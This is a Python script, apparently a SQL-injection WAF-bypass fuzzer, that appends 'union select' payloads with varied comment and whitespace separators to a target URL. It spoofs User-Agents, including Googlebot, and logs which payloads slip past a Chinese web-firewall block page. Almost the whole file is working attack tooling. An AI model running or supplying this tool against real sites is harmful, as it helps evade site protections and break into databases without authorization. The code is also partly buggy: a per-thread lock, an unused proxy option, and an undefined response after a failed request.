#!/usr/bin/python
'''
Sql pass tamper - To test sql
Version 1.0 Beta

The program written by Python3.
'''
import sys
import requests
import getopt
import random
import threading

tested = []
num = 0

class threadclass(threading.Thread):
    def __init__(self,url,proxies,db,key):
        threading.Thread.__init__(self)
        self.url = url
        self.proxies = proxies
        self.db = db
        self.key = key
        self.headers = [
            'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
            'Googlebot/2.1 (http://www.googlebot.com/bot.html)',
            'Opera/9.20 (Windows NT 6.0; U; en)',
            'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
            'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
            'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
            'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
            'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
            'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
            'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)',
            'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
            'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)'
        ]
        self.FUZZ_qwe = ['/*', '*/', '/*!', '/**/', '?', '/', '*', '=', '`', '!', '%', '.', '-', '+']
        self.FUZZ_ewq = [' ']
        self.FUZZ_sqllite = ['0A', '0D', '0C', '09', '20']
        self.FUZZ_mysql = ['09', '0A', '0B', '0C', '0D', 'A0', '20','aa']
        self.FUZZ_oracle = ['00', '09', '0A', '0B', '0C', '0D', '20']
        self.FUZZ_mssql = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '0A', '0B', '0C', '0D', '0E', '0F', '10',
                      '11', '12', '13', '14', '15', '16', '17', '18', '19', '1A', '1B', '1C', '1D', '1E', '1F', '20',
                      '25']
    def run(self):
        global num
        lock = threading.RLock()
        targetdb = 'self.FUZZ_'+self.db
        FUZZ = self.FUZZ_qwe+self.FUZZ_ewq+eval(targetdb)
        for a in FUZZ:
            for b in FUZZ:
                for c in FUZZ:
                    for d in FUZZ:
                        for e in FUZZ:
                            lock.acquire()
                            fix = a+b+c+d+e
                            if fix in tested:
                                pass
                            else:
                                tested.append(fix)
                                payload = ' union'+fix+'select'+fix+'1/*!*/'
                                url_test = self.url+payload
                                header = {'User-Agent': random.choice(self.headers)}
                                try:
                                    res = requests.get(url=url_test,headers=header,timeout=5)
                                except Exception:
                                    print(url_test+' requests failed')
                                    print(header)
                                with open('payload.txt','a+') as file:
                                    if '网站防火墙' in res.text:
                                        print(url_test+'\033[0;31;40m is bad\033[0m')
                                    elif self.key in res.text:
                                        print('[STATUS]'+url_test+'\033[0;32;40mIS OK!!!\033[0m')
                                        file.write(payload+'\n')
                                    else:
                                        print(url_test+' \033[0;33;40mnot a value select\033[0m')
                                num += 1
                                sys.stdout.write('\r进度：%s/%s    ' %(num,len(FUZZ)**5))
                                sys.stdout.flush()
                            lock.release()

def usage():
    print('./fixfuzz.py -u <url> -d <dbname> [-r <threads> -p -h]')
    print(' -u |--url <URL>')
    print(' -d |--dbms database kind<sqllite,mysql,oracle,mssql>')
    print(' -k |--key the correct response page have the key')
    print(' -r |--threads <Number of threads> Defaults to 16(max)')
    print(' -p |--proxy proxy(开发中)')
    print(' -h |--help Shows this help\n')
    print('Eg. ./fixfuzz.py -u http://127.0.0.1/news/list.php?id=11 -d mysql -r 256 -k MYSQL\n')
def main(argv):
    num = 1
    proxies = False
    threads = 16
    try:
        opts, args = getopt.getopt(argv, 'hp:r:d:u:k:', ['help', 'proxy=', 'url=', 'threads=', 'dbms=','key='])
    except getopt.GetoptError:
        usage()
        sys.exit(-1)
    for i,u in opts:
        if i in ('-h','--help'):
            usage()
            exit(-1)
        if i in ('-u','--url'):
            url = u
        if i in ('-d','--dbms'):
            db = u
        if i in ('-k','--key'):
            key = u
        if i in ('-r','--threads'):
            threads = u
        if i in ('-p','--proxy'):
            proxies = u
    if url == '' or db == '' or int(threads) > 16:
        usage()
        sys.exit(-1)
    threadlist = []
    for i in range(int(threads)):
        t = threadclass(url,proxies,db,key)
        threadlist.append(t)
        t.start()
    while len(threadlist) > 0:
        try:
            threadlist = [i.join(1) for i in threadlist if i is not None and i.isAlive()]
        except KeyboardInterrupt:
            print('\nShutting down threads...\n')
if __name__ == '__main__':
    main(sys.argv[1:])
